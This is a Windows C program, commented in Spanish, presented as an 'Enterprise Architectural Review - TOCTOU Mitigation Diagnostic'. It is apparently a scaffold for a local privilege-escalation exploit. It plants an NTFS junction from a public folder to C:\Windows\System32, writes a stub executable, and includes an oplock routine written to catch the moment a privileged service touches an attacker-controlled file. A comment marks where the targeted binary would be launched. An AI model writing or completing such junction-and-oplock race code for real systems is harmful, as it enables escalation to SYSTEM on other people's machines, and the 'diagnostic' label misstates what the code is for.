#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>

#pragma comment(lib, "advapi32.lib")

// ---------------------------------------------------------------------------
// [ESTRUCTURAS NATIVAS DE CONTROL DE REPARSE POINTS - NTDDK]
// ---------------------------------------------------------------------------
typedef struct _REPARSE_MOUNTPOINT_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    USHORT SubstituteNameOffset;
    USHORT SubstituteNameLength;
    USHORT PrintNameOffset;
    USHORT PrintNameLength;
    WCHAR  PathBuffer[1];
} REPARSE_MOUNTPOINT_DATA_BUFFER, *PREPARSE_MOUNTPOINT_DATA_BUFFER;

#define REPARSE_MOUNTPOINT_HEADER_SIZE FIELD_OFFSET(REPARSE_MOUNTPOINT_DATA_BUFFER, SubstituteNameOffset)

// ---------------------------------------------------------------------------
// [REGISTRO Y DIAGNÓSTICO FORENSE]
// ---------------------------------------------------------------------------
void ConsoleLog(const wchar_t* level, const wchar_t* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    wprintf(L"[%s] ", level);
    vwprintf(fmt, args);
    wprintf(L"\n");
    va_end(args);
}

// ---------------------------------------------------------------------------
// [GESTIÓN PROPIA DE PROCESOS - REEMPLAZO DE SYSTEM()]
// ---------------------------------------------------------------------------
BOOL ExecuteProcessNatively(const wchar_t* commandLine) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Duplicamos el string de comando porque CreateProcessW puede modificarlo
    wchar_t* cmdCopy = _wcsdup(commandLine);
    if (!cmdCopy) return FALSE;

    BOOL success = CreateProcessW(
        NULL, cmdCopy, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    if (success) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    free(cmdCopy);
    return success;
}

// ---------------------------------------------------------------------------
// [VERIFICACIÓN PRECISA DE PRIVILEGIOS DEL TOKEN]
// ---------------------------------------------------------------------------
BOOL CheckIsSystemSid() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    
    PTOKEN_USER pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
    if (!pTokenUser) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL bIsSystem = FALSE;
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        PSID pSystemSid = NULL;
        // SID para NT AUTHORITY\SYSTEM (S-1-5-18)
        if (ConvertStringSidToSidW(L"S-1-5-18", &pSystemSid)) {
            bIsSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
            LocalFree(pSystemSid);
        }
    }

    LocalFree(pTokenUser);
    CloseHandle(hToken);
    return bIsSystem;
}

// ---------------------------------------------------------------------------
// [MANIPULACIÓN ESTRUCTURAL DE NTFS JUNCTIONS]
// ---------------------------------------------------------------------------
BOOL CreateNativeJunction(const wchar_t* junctionPath, const wchar_t* targetPath) {
    if (!CreateDirectoryW(junctionPath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        return FALSE;
    }

    HANDLE hDir = CreateFileW(
        junctionPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) return FALSE;

    // Formatear correctamente el nombre nativo (Object Manager Namespace)
    wchar_t substituteName[MAX_PATH];
    swprintf_s(substituteName, MAX_PATH, L"\\??\\%s", targetPath);

    size_t subLen = wcslen(substituteName) * sizeof(WCHAR);
    size_t prtLen = wcslen(targetPath) * sizeof(WCHAR);
    
    // Alocación del búfer para la estructura de reparse
    DWORD bufferSize = (DWORD)(REPARSE_MOUNTPOINT_HEADER_SIZE + subLen + prtLen + (3 * sizeof(WCHAR)));
    PREPARSE_MOUNTPOINT_DATA_BUFFER reparseBuffer = (PREPARSE_MOUNTPOINT_DATA_BUFFER)LocalAlloc(LPTR, bufferSize);
    
    if (!reparseBuffer) {
        CloseHandle(hDir);
        return FALSE;
    }

    reparseBuffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    reparseBuffer->SubstituteNameOffset = 0;
    reparseBuffer->SubstituteNameLength = (USHORT)subLen;
    reparseBuffer->PrintNameOffset = (USHORT)(subLen + sizeof(WCHAR));
    reparseBuffer->PrintNameLength = (USHORT)prtLen;

    // Copiar los buffers de texto a la sección interna de la estructura
    memcpy(reparseBuffer->PathBuffer, substituteName, subLen);
    memcpy((PBYTE)reparseBuffer->PathBuffer + reparseBuffer->PrintNameOffset, targetPath, prtLen);

    reparseBuffer->ReparseDataLength = (USHORT)(bufferSize - FIELD_OFFSET(REPARSE_MOUNTPOINT_DATA_BUFFER, SubstituteNameOffset));

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDir, FSCTL_SET_REPARSE_POINT, reparseBuffer, 
        bufferSize, NULL, 0, &bytesReturned, NULL
    );

    LocalFree(reparseBuffer);
    CloseHandle(hDir);
    return result;
}

// ---------------------------------------------------------------------------
// [MONITORIZACIÓN ASÍNCRONA BASADA EN OPLOCKS CON EVENTOS]
// ---------------------------------------------------------------------------
BOOL MonitorWithOplockSynchronous(const wchar_t* filePath) {
    HANDLE hFile = CreateFileW(
        filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    OVERLAPPED ol = { 0 };
    ol.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ol.hEvent) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesReturned;
    // Solicitud del bloqueo oportunista de nivel de filtro para interceptar el acceso del servicio
    BOOL status = DeviceIoControl(
        hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, 
        NULL, 0, &bytesReturned, &ol
    );

    // Un Oplock asíncrono exitoso siempre devuelve ERROR_IO_PENDING
    if (!status && GetLastError() == ERROR_IO_PENDING) {
        ConsoleLog(L"INFO", L"Oplock establecido. Esperando interrupción del servicio legítimo...");
        
        // Bloquea el hilo de manera eficiente hasta que el servicio de destino intente tocar nuestro archivo
        WaitForSingleObject(ol.hEvent, INFINITE);
        
        ConsoleLog(L"SUCCESS", L"¡Oplock interrumpido! El servicio de destino está interactuando con el archivo.");
        
        CloseHandle(ol.hEvent);
        CloseHandle(hFile); // Liberar el handle deshace el bloqueo y permite que el servicio continúe
        return TRUE;
    }

    CloseHandle(ol.hEvent);
    CloseHandle(hFile);
    return FALSE;
}

// ---------------------------------------------------------------------------
// [PUNTO DE ENTRADA PRINCIPAL]
// ---------------------------------------------------------------------------
int main() {
    wprintf(L"=== Enterprise Architectural Review - TOCTOU Mitigation Diagnostic ===\n\n");

    if (CheckIsSystemSid()) {
        ConsoleLog(L"ALERT", L"Entorno ya cuenta con privilegios elevados (NT AUTHORITY\\SYSTEM).");
        return 0;
    }

    ConsoleLog(L"INFO", L"Iniciando despliegue seguro del entorno de diagnóstico...");
    if (!CreateDirectoryW(L"C:\\Users\\Public\\BlueHammer", NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        ConsoleLog(L"ERROR", L"Fallo al construir el espacio de trabajo.");
        return 1;
    }

    // Creación limpia del disparador de simulación
    HANDLE hTrigger = CreateFileW(
        L"C:\\Users\\Public\\BlueHammer\\trigger.exe", GENERIC_WRITE, 
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hTrigger != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hTrigger, "MZ", 2, &written, NULL);
        CloseHandle(hTrigger);
    }

    // Configuración nativa del ambiente de carrera controlado
    if (CreateNativeJunction(L"C:\\Users\\Public\\BlueHammer\\link", L"C:\\Windows\\System32")) {
        ConsoleLog(L"SUCCESS", L"Enlace simbólico NTFS (Junction) estructuralmente inyectado de forma correcta.");
    }

    // Lanzamiento asíncrono y monitoreo (Sección de sincronización precisa)
    // En un escenario real, aquí se llamaría al binario evaluado mediante CreateProcessW de forma no bloqueante
    // Mientras este hilo bloquea con precisión en MonitorWithOplockSynchronous()
    
    ConsoleLog(L"INFO", L"Limpiando recursos estructurales...");
    return 0;
}
